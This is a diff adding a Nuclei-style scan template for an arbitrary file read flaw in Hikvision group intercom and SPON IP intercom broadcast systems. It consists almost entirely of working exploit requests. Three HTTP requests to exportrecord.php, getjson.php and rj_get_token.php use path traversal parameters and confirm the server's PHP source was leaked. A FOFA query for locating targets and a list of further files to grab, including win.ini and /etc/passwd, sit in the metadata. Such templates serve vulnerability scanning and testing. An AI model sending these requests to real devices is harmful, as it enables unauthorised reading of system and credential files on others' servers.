@@ -1,0 +1,65 @@
+id: hikvision-spon-group-intercom-mutli-fileread
+info:
+  name: hikvision 群组对讲服务配置平台 or 世邦通信 SPON IP 网络对讲广播系统 - fileread
+  author: leadlife
+  severity: high
+  metadata:
+    verified: true
+    fofa-query: icon_hash="-1830859634" || body="js/jquery.breadcrumbs.ex.js"
+    tips: C:\ICPAS\Wnmp\WWW\php\conversion.php, ../php/exportrecord.php, ./ocx.json, c:/windows/win.ini, ../../../../../etc/passwd
+  tags: spon,fileread,2021,hikvision
+
+http:
+  - raw:
+      - |
+        GET /php/exportrecord.php?downtype=10&downname=../php/getjson.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: exportrecord.php
+        dsl:
+          - status_code == 200
+          - contains(body,'json_string = file_get_contents')
+        condition: and
+
+  - raw:
+      - |
+        POST /php/getjson.php HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 44
+
+        jsondata[filename]=../php/getjson.php
+      
+    matchers:
+      - type: dsl
+        name: getjson.php
+        dsl:
+          - status_code == 200
+          - contains(body,'json_string = file_get_contents')
+        condition: and
+
+  - raw:
+      - |
+        POST /php/rj_get_token.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+
+        jsondata[url]=../php/getjson.php
+
+    matchers:
+      - type: dsl
+        name: rj_get_token.php
+        dsl:
+          - status_code == 200
+          - contains(body,'json_string = file_get_contents')
+        condition: and
